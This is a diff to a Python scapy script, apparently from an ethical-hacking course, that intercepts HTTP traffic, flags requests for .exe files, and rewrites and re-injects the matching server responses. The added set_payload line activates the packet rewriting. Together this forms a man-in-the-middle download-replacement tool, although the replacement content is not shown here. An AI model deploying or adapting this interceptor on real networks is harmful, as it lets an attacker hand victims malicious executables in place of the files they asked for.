@@ -130,8 +130,11 @@ def process_packet(packet):
 #     del scapy_packet[scapy.TCP].chksum
 
 
-13 We have modified scapy_packet sof far, still we have not modified actual packet
-that will be sent to the target
+# 13 We have modified scapy_packet sof far, still we have not modified actual packet
+# that will be sent to the target
+# This can be done like this: packet.set_payload(str(scapy_packet))
+
+# 14 Now to test the code, run the program 1file-interceptor.py and download the file from browser url
 
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
@@ -139,7 +142,7 @@ that will be sent to the target
             if ".exe" in scapy_packet[scapy.raw].load:
                 print("[+] exe request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+                # print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport ==80:
             print("HTTP response")
             if scapy_packet[scapy.TCP].seq in ack_list:
@@ -149,7 +152,8 @@ that will be sent to the target
                 del scapy_packet[scapy.IP].len
                 del scapy_packet[scapy.IP].chksum
                 del scapy_packet[scapy.TCP].chksum
-            print(scapy_packet.show())
+                packet.set_payload(str(scapy_packet))
+            # print(scapy_packet.show())
 
 
 
